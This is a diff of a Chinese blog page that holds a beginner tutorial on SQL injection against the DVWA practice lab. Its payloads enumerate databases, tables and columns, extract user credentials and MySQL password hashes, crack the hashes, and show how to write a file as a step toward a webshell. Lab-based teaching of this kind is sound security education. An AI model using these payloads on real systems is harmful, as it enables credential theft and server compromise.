@@ -130,7 +130,7 @@
 <meta property="og:image" content="http://ovjsmeumq.bkt.clouddn.com/hash.png">
 <meta property="og:image" content="http://ovjsmeumq.bkt.clouddn.com/%E6%94%B9%E7%BC%96%E7%A0%81.png">
 <meta property="og:image" content="http://ovjsmeumq.bkt.clouddn.com/webshell.png">
-<meta property="og:updated_time" content="2017-09-09T15:04:28.850Z">
+<meta property="og:updated_time" content="2017-09-10T12:43:41.261Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="面向新手SQL注入（上）">
 <meta name="twitter:description" content="今天介绍一个相当强大的web漏洞，sql注入。这也是参加课程后第一门掌握比较熟练的技术（因为其他的都不会……），它的威力很强，可以获取网站管理员的用户名和密码、获取数据库内用户的姓名手机号邮箱QQ家庭地址身份证等等敏感信息、严重者整个数据库都会被全部盗取（脱库）、获取服务器的权限、制造万能密码等等危害，反正SQL注入针对着数据库，所以这些数据库你想怎么玩都可以，前提是真的可以利用它们。由于本人理解">
@@ -406,7 +406,7 @@
       
 
       
-        <p>今天介绍一个相当强大的web漏洞，sql注入。这也是参加课程后第一门掌握比较熟练的技术（因为其他的都不会……），它的威力很强，可以获取网站管理员的用户名和密码、获取数据库内用户的姓名手机号邮箱QQ家庭地址身份证等等敏感信息、严重者整个数据库都会被全部盗取（脱库）、获取服务器的权限、制造万能密码等等危害，反正SQL注入针对着数据库，所以这些数据库你想怎么玩都可以，前提是真的可以利用它们。<br>由于本人理解能力较差，有些地方需要一些时间才弄懂，在写文章时可能很繁琐的来讲解，不像那些牛人一样言简意赅，请见谅。</p>
+        <p>今天介绍一个相当强大的web漏洞，sql注入。这也是参加课程后第一门掌握比较熟练的技术（因为其他的都不会……），它的威力很强，可以获取网站管理员的用户名和密码、获取数据库内用户的姓名手机号邮箱QQ家庭地址身份证等等敏感信息、严重者整个数据库都会被全部盗取（脱库）、获取服务器的权限、制造万能密码等等危害，反正SQL注入针对着数据库，所以这些数据库你想怎么玩都可以，前提是真的可以利用它们。<br>由于本人理解能力较差，有些地方需要一些时间才弄懂，在写文章时可能很繁琐的来讲解，不像那些牛人一样言简意赅，请见谅。文章会持续优化更新并进行内容修改补充。</p>
 <a id="more"></a>
 <h2 id="SQL和数据库"><a href="#SQL和数据库" class="headerlink" title="SQL和数据库"></a>SQL和数据库</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><a href="https://baike.baidu.com/item/%E7%BB%93%E6%9E%84%E5%8C%96%E6%9F%A5%E8%AF%A2%E8%AF%AD%E8%A8%80/10450182?fr=aladdin&amp;fromid=86007&amp;fromtitle=sql" target="_blank" rel="external">SQL</a>（结构化查询语言）,是一种<a href="https://baike.baidu.com/item/ANSI%E6%A0%87%E5%87%86" target="_blank" rel="external">ANSI标准</a>的计算机语言，用于访问和处理数据库。<br>数据库好比一个仓库，里面存放着用户的各种信息，比如注册时填写的用户、密码、手机号、邮箱等等信息，还可以存放网站的各种信息，比如用户订单、网站的网页代码、管理员的用户名密码等等，而sql语言就是用来访问（查看）和处理（修改、更新）这些信息的。<br>常见的数据库系统有 MS Access、DB2、Informix、MS SQL Server、Oracle、Sybase 以及其他数据库系统。</p>
 <h3 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h3><p>简单来说，就是用户能够控制修改暴露的SQL语句进行后台数据库的操作，获取或修改我们想要的信息。<br>SQL注入的本质是数据和代码没有分离，即用户输入的数据请求被当做代码来处理执行.<br>SQL注入的必备条件是，要有可以控制输入的数据和服务器要执行的代码拼接了这些输入的数据。</p>
@@ -436,15 +436,9 @@
 <li>注释</li>
 </ul>
 <p><code>#…………</code> 在需注释的内容前加 <code>#</code> 可注释直到该行结束<br><code>-- ……</code> 在需注释的内容前加 <code>--</code>和一个空格 可注释直到该行结束<br><code>/*……*/</code> 多行注释，类似c++.</p>
-<h2 id="SQL注入基本探测"><a href="#SQL注入基本探测" class="headerlink" title="SQL注入基本探测"></a>SQL注入基本探测</h2><h3 id="手动搭建测试环境"><a href="#手动搭建测试环境" class="headerlink" title="手动搭建测试环境"></a>手动搭建测试环境</h3><ul>
-<li><strong>phpstudy</strong></li>
-</ul>
-<p>下载<a href="http://www.phpstudy.net/download.html" target="_blank" rel="external">phpstudy</a>,搭建php调试环境，用以解析处理php文件。</p>
+<h2 id="SQL注入基本探测"><a href="#SQL注入基本探测" class="headerlink" title="SQL注入基本探测"></a>SQL注入基本探测</h2><h3 id="手动搭建测试环境"><a href="#手动搭建测试环境" class="headerlink" title="手动搭建测试环境"></a>手动搭建测试环境</h3><h4 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h4><p>下载<a href="http://www.phpstudy.net/download.html" target="_blank" rel="external">phpstudy</a>,搭建php调试环境，用以解析处理php文件。</p>
 <p><img src="http://ovjsmeumq.bkt.clouddn.com/phpstudy.png" alt="phpstudy"></p>
-<ul>
-<li><strong>DVWA测试环境</strong></li>
-</ul>
-<p>网上有大神可以自己写代码搭建，这里就不带着一起写代码了，直接使用一个靶机来测试。<br>进入<a href="http://www.dvwa.co.uk/" target="_blank" rel="external">DVWA官网</a>点击download下载，解压，将解压后的文件夹全部复制到网站根目录下（打开phpstudy，点击其他选项菜单，点选网站根目录），打开文件夹后打开config文件夹，用编辑器打开其中的配置文件，将如图所示的user和password改成mysql数据库的，默认两个都是root。保存后，将该文件的后缀改为<code>.php</code>，不然会找不到配置文件。<br><img src="http://ovjsmeumq.bkt.clouddn.com/config.png" alt="config"></p>
+<h4 id="DVWA测试环境"><a href="#DVWA测试环境" class="headerlink" title="DVWA测试环境"></a>DVWA测试环境</h4><p>网上有大神可以自己写代码搭建，这里就不带着一起写代码了，直接使用一个靶机来测试。<br>进入<a href="http://www.dvwa.co.uk/" target="_blank" rel="external">DVWA官网</a>点击download下载，解压，将解压后的文件夹全部复制到网站根目录下（打开phpstudy，点击其他选项菜单，点选网站根目录），打开文件夹后打开config文件夹，用编辑器打开其中的配置文件，将如图所示的user和password改成mysql数据库的，默认两个都是root。保存后，将该文件的后缀改为<code>.php</code>，不然会找不到配置文件。<br><img src="http://ovjsmeumq.bkt.clouddn.com/config.png" alt="config"></p>
 <p><img src="http://ovjsmeumq.bkt.clouddn.com/dvwa1.png" alt="配置"></p>
 <p><img src="http://ovjsmeumq.bkt.clouddn.com/configphp.png" alt="修改文件为.php"></p>
 <p>确认phpstudy已经打开并启动，且apache和mysql后为绿色。(可以在php版本中选择其他数据库，这里用默认即可)<br><img src="http://ovjsmeumq.bkt.clouddn.com/phpstudy.png" alt="phpstudy"></p>
@@ -473,45 +467,27 @@
 <p><img src="http://ovjsmeumq.bkt.clouddn.com/version.png" alt="查看版本号"></p>
 <p>查看user<code>1&#39; union select user(),version();#</code><br><img src="http://ovjsmeumq.bkt.clouddn.com/user.png" alt="user()"></p>
 <h3 id="探测数据库"><a href="#探测数据库" class="headerlink" title="探测数据库"></a>探测数据库</h3><p>学会拼接后，就可以使用更多的语法进行数据库的探测。</p>
-<ul>
-<li><strong>获取数据库名称</strong></li>
-</ul>
-<p>在MySQL中，数据库名存放在information_schema数据库下的schemata表中的schema_name中，我们利用拼接和select命令获取他们。<br>在框中输入 <code>1&#39; union select schema_name,null from information_schema.schemata;#</code> 可以看到，数据库名称已经提取出了，在对应的first_name中。<br><img src="http://ovjsmeumq.bkt.clouddn.com/databases.png" alt="databases"></p>
-<ul>
-<li><strong>获取数据表名称</strong></li>
-</ul>
-<p>在MySQL中，数据表名存放在information_schema数据库下的tables表中的table_name字段中。<br>在框中输入命令 <code>1&#39; union select table_name,null from information_schema.tables;#</code> ，获取了所有的数据表名，。<br><img src="http://ovjsmeumq.bkt.clouddn.com/tables.png" alt="tables"></p>
+<h4 id="获取数据库名称"><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h4><p>在MySQL中，数据库名存放在information_schema数据库下的schemata表中的schema_name中，我们利用拼接和select命令获取他们。<br>在框中输入 <code>1&#39; union select schema_name,null from information_schema.schemata;#</code> 可以看到，数据库名称已经提取出了，在对应的first_name中。<br><img src="http://ovjsmeumq.bkt.clouddn.com/databases.png" alt="databases"></p>
+<h4 id="获取数据表名称"><a href="#获取数据表名称" class="headerlink" title="获取数据表名称"></a>获取数据表名称</h4><p>在MySQL中，数据表名存放在information_schema数据库下的tables表中的table_name字段中。<br>在框中输入命令 <code>1&#39; union select table_name,null from information_schema.tables;#</code> ，获取了所有的数据表名，。<br><img src="http://ovjsmeumq.bkt.clouddn.com/tables.png" alt="tables"></p>
 <p>如果我们只需要某一个数据库的表，我们可以使用where语句 <code>1&#39; union select table_name,null from information_schema.tables where table_schema = &#39;dvwa&#39;;#</code> 显示了有两个数据表。</p>
 <p><img src="http://ovjsmeumq.bkt.clouddn.com/table%20dvwa.png" alt="dvwa tables"></p>
 <p>我们查看数据库dvwa的表确实如此。<br><img src="http://ovjsmeumq.bkt.clouddn.com/table%20dvwa2.png" alt="蛤"></p>
-<ul>
-<li><strong>获取列名（栏目名）</strong></li>
-</ul>
-<p>在MySQL中，字段名存放在information_schema数据库下的columns表的column_name中。<br>同理，输入<code>1&#39; union select column_name,null from information_schema.columns where table_name = &#39;users&#39; and table_schema = &#39;dvwa&#39;;#</code>使用where语句确定在哪一个数据库下的哪一个表。如果想要获取全部则去掉where语句即可。</p>
+<h4 id="获取列名（栏目名）"><a href="#获取列名（栏目名）" class="headerlink" title="获取列名（栏目名）"></a>获取列名（栏目名）</h4><p>在MySQL中，字段名存放在information_schema数据库下的columns表的column_name中。<br>同理，输入<code>1&#39; union select column_name,null from information_schema.columns where table_name = &#39;users&#39; and table_schema = &#39;dvwa&#39;;#</code>使用where语句确定在哪一个数据库下的哪一个表。如果想要获取全部则去掉where语句即可。</p>
 <p><img src="http://ovjsmeumq.bkt.clouddn.com/columns.png" alt="columns"></p>
 <p>我们成功了。</p>
 <p><img src="http://ovjsmeumq.bkt.clouddn.com/columns2.png" alt="columns"></p>
-<ul>
-<li><strong>获取数据信息</strong></li>
-</ul>
-<p>输入 <code>1&#39; union select user,null from users;#</code>和 <code>1&#39; union select password,null from users;#</code> 我们就获取了dvwa的用户名和他们的密码。</p>
+<h4 id="获取数据信息"><a href="#获取数据信息" class="headerlink" title="获取数据信息"></a>获取数据信息</h4><p>输入 <code>1&#39; union select user,null from users;#</code>和 <code>1&#39; union select password,null from users;#</code> 我们就获取了dvwa的用户名和他们的密码。</p>
 <p><img src="http://ovjsmeumq.bkt.clouddn.com/users.png" alt="image"><br><img src="http://ovjsmeumq.bkt.clouddn.com/password.png" alt="image"></p>
 <p>密码经过md5加密，到<a href="https://www.somd5.com/" target="_blank" rel="external">md5解密网</a>站解密即可</p>
 <p><img src="http://ovjsmeumq.bkt.clouddn.com/md5.png" alt="md5解密"></p>
 <p><strong>注：从以上可以看出，union后的select至少有两个位置来组合进行，才能查看数据库名、表名、列名以及其他信息。当有很多位置时，我们可以非常高兴了，可以将这些命令统统装进一个语句里，还有空位补充null，省时省力。</strong></p>
-<ul>
-<li><strong>获取哈希密码</strong></li>
-</ul>
-<p>请参考：<a href="http://www.cnblogs.com/leoo2sk/archive/2010/10/01/hash-and-encrypt.html" target="_blank" rel="external">哈希（Hash）与加密（Encrypt）的区别</a> 了解哈希和加密。</p>
+<h4 id="获取哈希密码"><a href="#获取哈希密码" class="headerlink" title="获取哈希密码"></a>获取哈希密码</h4><p>请参考：<a href="http://www.cnblogs.com/leoo2sk/archive/2010/10/01/hash-and-encrypt.html" target="_blank" rel="external">哈希（Hash）与加密（Encrypt）的区别</a> 了解哈希和加密。</p>
 <p>MySQL在数据库mysql的user表中保存哈希值，输入<code>1&#39; union select password,null from mysql.user;#</code> </p>
 <p><img src="http://ovjsmeumq.bkt.clouddn.com/hash.png" alt="hash"><br>该哈希刚好使用md5进行加密，解密后为root。</p>
 <p>此处输入可能会报错，大概是 <code>Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (latin1_chinese_ci,COERCIBLE) for operation &#39;union&#39;</code></p>
 <p>这是两个数据库的编码类型不同导致，union语句强调前后的一致性。只要将其中一个表改为另一个表的编码即可。我将mysql的user表的编码设为gdk。切换到mysql数据库，输入 <code>alter table user convert to character set gbk;</code></p>
 <p><img src="http://ovjsmeumq.bkt.clouddn.com/%E6%94%B9%E7%BC%96%E7%A0%81.png" alt="改编码"></p>
-<ul>
-<li><strong>获取webshell</strong></li>
-</ul>
-<p>说白了就是向服务器上穿恶意代码文件，留后门。</p>
+<h4 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h4><p>说白了就是向服务器上穿恶意代码文件，留后门。</p>
 <p>MYSQL写入文件的命令是<code>select ………… into outfile &quot;file_location&quot;</code> 但是我们需要得到网站的绝对路径。</p>
 <p>例如<code>select &quot;&lt;?php echo &#39;hello world&#39;; ?&gt;&quot; into outfile &quot;E:\phpStudy\WWW\DVWA-master&quot;;</code></p>
 <p><img src="http://ovjsmeumq.bkt.clouddn.com/webshell.png" alt="webshell"></p>
@@ -741,7 +717,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL和数据库"><span class="nav-number">1.</span> <span class="nav-text">SQL和数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简介"><span class="nav-number">1.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是SQL注入"><span class="nav-number">1.2.</span> <span class="nav-text">什么是SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入常用语法"><span class="nav-number">1.3.</span> <span class="nav-text">SQL注入常用语法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入基本探测"><span class="nav-number">2.</span> <span class="nav-text">SQL注入基本探测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#手动搭建测试环境"><span class="nav-number">2.1.</span> <span class="nav-text">手动搭建测试环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#验证sql注入漏洞"><span class="nav-number">2.2.</span> <span class="nav-text">验证sql注入漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#拼接语句探测信息"><span class="nav-number">2.3.</span> <span class="nav-text">拼接语句探测信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#探测数据库"><span class="nav-number">2.4.</span> <span class="nav-text">探测数据库</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL和数据库"><span class="nav-number">1.</span> <span class="nav-text">SQL和数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简介"><span class="nav-number">1.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是SQL注入"><span class="nav-number">1.2.</span> <span class="nav-text">什么是SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入常用语法"><span class="nav-number">1.3.</span> <span class="nav-text">SQL注入常用语法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入基本探测"><span class="nav-number">2.</span> <span class="nav-text">SQL注入基本探测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#手动搭建测试环境"><span class="nav-number">2.1.</span> <span class="nav-text">手动搭建测试环境</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#phpstudy"><span class="nav-number">2.1.1.</span> <span class="nav-text">phpstudy</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DVWA测试环境"><span class="nav-number">2.1.2.</span> <span class="nav-text">DVWA测试环境</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#验证sql注入漏洞"><span class="nav-number">2.2.</span> <span class="nav-text">验证sql注入漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#拼接语句探测信息"><span class="nav-number">2.3.</span> <span class="nav-text">拼接语句探测信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#探测数据库"><span class="nav-number">2.4.</span> <span class="nav-text">探测数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#获取数据库名称"><span class="nav-number">2.4.1.</span> <span class="nav-text">获取数据库名称</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取数据表名称"><span class="nav-number">2.4.2.</span> <span class="nav-text">获取数据表名称</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取列名（栏目名）"><span class="nav-number">2.4.3.</span> <span class="nav-text">获取列名（栏目名）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取数据信息"><span class="nav-number">2.4.4.</span> <span class="nav-text">获取数据信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取哈希密码"><span class="nav-number">2.4.5.</span> <span class="nav-text">获取哈希密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取webshell"><span class="nav-number">2.4.6.</span> <span class="nav-text">获取webshell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
             
 
           </div>
